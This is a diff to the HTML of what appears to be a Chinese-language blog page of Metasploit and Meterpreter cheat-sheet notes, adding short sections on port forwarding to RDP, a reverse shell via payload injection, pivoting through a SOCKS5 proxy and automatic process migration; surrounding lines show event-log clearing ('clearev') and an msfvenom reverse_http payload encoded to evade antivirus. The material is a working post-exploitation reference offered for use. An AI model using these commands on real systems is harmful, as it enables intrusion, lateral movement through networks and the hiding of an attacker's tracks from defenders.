@@ -457,7 +457,7 @@ getsy">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    1.4k
+                    1.5k
                 </div>
                 
 
@@ -523,6 +523,31 @@ clearev 清除痕迹</code></pre>
 <h3 id="扫描内网"><a href="#扫描内网" class="headerlink" title="扫描内网"></a>扫描内网</h3><pre class="language-none"><code class="language-none">use auxiliary/scanner/portscan/tcp</code></pre>
 
 <h3 id="创建快捷脚本"><a href="#创建快捷脚本" class="headerlink" title="创建快捷脚本"></a>创建快捷脚本</h3><pre class="language-none"><code class="language-none">makerc &lt;name&gt;</code></pre>
+
+
+
+<h3 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3><pre class="language-none"><code class="language-none">portfwd add -l 2222 -r 192.168 -p 3389  </code></pre>
+
+
+
+<h3 id="使用其他协议反弹shell"><a href="#使用其他协议反弹shell" class="headerlink" title="使用其他协议反弹shell"></a>使用其他协议反弹shell</h3><pre class="language-none"><code class="language-none">use  windows/local/payload_inject</code></pre>
+
+
+
+<h3 id="pivot-socks5代理"><a href="#pivot-socks5代理" class="headerlink" title="pivot + socks5代理"></a>pivot + socks5代理</h3><pre class="language-none"><code class="language-none">route add 10.10.10.1 255.255.255.0 1
+route print
+
+use auxiliary/server/socks_proxy 
+show options
+run</code></pre>
+
+
+
+<h3 id="Socks5代理"><a href="#Socks5代理" class="headerlink" title="Socks5代理"></a>Socks5代理</h3><pre class="language-none"><code class="language-none">export ALL_PROXY=socks5://127.0.0.1:1080</code></pre>
+
+
+
+<h3 id="自动迁移"><a href="#自动迁移" class="headerlink" title="自动迁移"></a>自动迁移</h3><pre class="language-none"><code class="language-none">set AutoRunScript migrate -f  自动迁移进程</code></pre>
 
 
 
@@ -1162,7 +1187,7 @@ msfvenom -p windows/meterpreter/reverse_http -e x86/shikata_ga_nai -i 8 -b ‘\x
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;Total Words:&nbsp;<span
-                        class="white-color">25.7k</span>
+                        class="white-color">26.1k</span>
             
             
             
